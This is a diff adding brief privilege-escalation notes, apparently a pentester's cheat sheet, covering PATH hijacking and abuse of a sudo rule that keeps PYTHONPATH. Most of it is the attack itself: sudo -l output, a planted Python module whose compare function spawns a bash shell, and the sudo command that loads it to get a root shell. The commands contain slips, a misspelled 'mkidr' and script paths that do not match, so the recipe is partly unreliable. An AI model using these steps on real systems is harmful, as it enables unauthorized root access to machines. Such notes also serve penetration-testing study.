@@ -1,0 +1,17 @@
+### PATH ###
+
+export PATH=/tmp:$PATH
+
+
+## python env
+$ sudo -l									# could also work as SUID
+    mail_badpass, env_keep+=PYTHONPATH						# PYTHONPATH is kept
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/dev/test.py
+
+$ mkidr /tmp/path
+#!/usr/bin/env python3
+import pty
+def compare(a, aa, aaa):
+  pty.spawn("/bin/bash")
+
+$ sudo PYTHONPATH=/tmp/path /usr/bin/python3 /opt/development/test_module.py	# will use our compare method
